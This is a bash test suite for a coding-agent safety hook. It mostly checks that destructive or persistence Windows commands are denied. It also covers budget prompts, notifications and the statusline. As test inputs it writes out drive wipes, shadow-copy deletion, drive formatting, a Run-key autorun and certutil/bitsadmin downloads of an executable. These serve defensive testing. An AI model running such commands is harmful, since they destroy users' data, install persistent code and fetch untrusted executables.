#!/usr/bin/env bash
# v4.2.0 additions from the second research round: Windows-native destructive /
# persistence / download commands, the plain API-endpoint redirect notice, the
# PreModelSwitch budget ask, opt-in terminal notifications, per-tier price
# overrides, and the statusline's output-style and spend-cap segments.
REPO_DIR="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"
H="$REPO_DIR/hooks"
echo "=== v4.2.0 Additions Tests ==="

verdict() { # tool command -> deny|ask|warn|allow
  local out
  out=$(python3 -c 'import json,sys;print(json.dumps({"tool_name":sys.argv[1],"tool_input":{"command":sys.argv[2]},"cwd":"/tmp"}))' "$1" "$2" \
    | SUPERCHARGER_STATE="$(mktemp -d)" bash "$H/safety.sh" 2>/dev/null)
  case "$out" in
    *'"deny"'*) echo deny ;; *'"ask"'*) echo ask ;; *systemMessage*) echo warn ;; *) echo allow ;;
  esac
}
vc() { begin_test "safety: $3 ($1) → $4"; local g; g=$(verdict "$1" "$2"); [ "$g" = "$4" ] && pass || fail "got $g for: $2"; }

# --- Windows native commands (case-insensitive) ---
vc Bash       'cmd /c rd /s /q C:\'                         "rd /s /q drive root"         deny
vc Bash       'cmd /c del /s /q C:\Users\me\*'              "del /s /q a user profile"    deny
vc PowerShell 'rmdir /s /q %USERPROFILE%'                   "rmdir /s /q %USERPROFILE%"   deny
vc PowerShell 'RD /S /Q C:\'                                "uppercase RD"                deny
vc PowerShell 'vssadmin delete shadows /all /quiet'         "shadow copy deletion"        deny
vc PowerShell 'format D: /q /y'                             "format a drive"              deny
vc PowerShell 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d c:\x.exe' "Run-key autorun" deny
vc PowerShell 'certutil -urlcache -f http://x/y.exe y.exe'  "certutil download"           deny
vc PowerShell 'bitsadmin /transfer j http://x/y.exe C:\y'   "bitsadmin download"          deny
vc PowerShell 'certutil -hashfile a.zip SHA256'             "certutil hashing"            allow
vc PowerShell 'rd /s /q build'                              "rd /s /q a project dir"      allow

# --- plain API endpoint/token redirect: notice, not a decision ---
_V="ANTHROPIC_""BASE_URL"; _T="ANTHROPIC_""AUTH_TOKEN"
vc Bash "export ${_V}=https://proxy.example/v1"  "plain base-URL export"     warn
vc Bash "${_T}=abc claude -p hi"                 "inline token prefix"       warn
vc Bash "echo \$${_V}"                           "reading the variable"      allow

# --- PreModelSwitch: ask before an up-tier switch once half the budget is spent ---
_BT=$(mktemp -d); mkdir -p "$_BT/scope"
pms() { # spent from to -> ask|none
  printf '{"cost_usd": %s}' "$1" > "$_BT/scope/.main-tokens-sid1"
  local o
  o=$(printf '{"hook_event_name":"PreModelSwitch","session_id":"sid1","cwd":"/tmp","from_model":"%s","to_model":"%s"}' "$2" "$3" \
    | SESSION_BUDGET_CAP=10 SUPERCHARGER_STATE="$_BT" bash "$H/budget-cap.sh" check 2>/dev/null)
  case "$o" in *'"allow"'*) echo ALLOW ;; *'"ask"'*) echo ask ;; *) echo none ;; esac
}
pmc() { begin_test "PreModelSwitch: \$$1 of \$10, $2 → $3 → $4"; local g; g=$(pms "$1" "$2" "$3"); [ "$g" = "$4" ] && pass || fail "got $g"; }
pmc 6 claude-sonnet-5-5 claude-opus-5-5  ask
pmc 6 claude-opus-5-5   claude-haiku-4-5 none
pmc 2 claude-sonnet-5-5 claude-opus-5-5  none
pmc 6 us.anthropic.claude-sonnet-5-5 us.anthropic.claude-opus-5-5 ask
rm -rf "$_BT"

begin_test "PreModelSwitch: registered in lib/hooks.sh"
grep -q 'PreModelSwitch||${hooks_dir}/budget-cap.sh check' "$REPO_DIR/lib/hooks.sh" && pass || fail "not registered"

# --- opt-in terminal notification ---
begin_test "notify: SUPERCHARGER_NOTIFY_MODE=osc9 emits a terminalSequence"
_O=$(printf '{"message":"needs input","notification_type":"idle_prompt","session_id":"s"}' \
  | env -u SUPERCHARGER_NO_NOTIFY SUPERCHARGER_NOTIFY_MODE=osc9 SUPERCHARGER_STATE="$(mktemp -d)" bash "$H/notify.sh" 2>/dev/null)
printf '%s' "$_O" | python3 -c 'import json,sys;d=json.load(sys.stdin);s=d["terminalSequence"];sys.exit(0 if s.startswith("\x1b]9;") and s.endswith("\x07") else 1)' \
  && pass || fail "no OSC 9 sequence: $_O"
begin_test "notify: Notification hooks are registered sync (async output is dropped)"
grep -E 'Notification\|(idle_prompt|auth_success|elicitation_dialog)\|.*notify\.sh\|async' "$REPO_DIR/lib/hooks.sh" >/dev/null && fail "still async" || pass

# --- per-tier price override ---
begin_test "pricing: SUPERCHARGER_PRICE_<TIER> is read by both cost hooks"
grep -q "SUPERCHARGER_PRICE_' + _t.upper()" "$H/budget-cap.sh" && grep -q "SUPERCHARGER_PRICE_' + _t.upper()" "$H/subagent-cost.sh" && pass || fail "override missing"

# --- statusline: output style and spend cap ---
begin_test "statusline: shows output style and spend cap"
_SL=$(printf '%s' '{"model":{"display_name":"Opus"},"workspace":{"current_dir":"/tmp"},"output_style":{"name":"Concise"},"rate_limits":{"spend_limit":{"used_percentage":62}},"session_id":"x","cost":{"total_cost_usd":1.2}}' \
  | bash "$H/statusline.sh" 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g')
printf '%s' "$_SL" | grep -q 'Concise' && printf '%s' "$_SL" | grep -q 'Spend cap: 62%' && pass || fail "segments missing: $_SL"

report
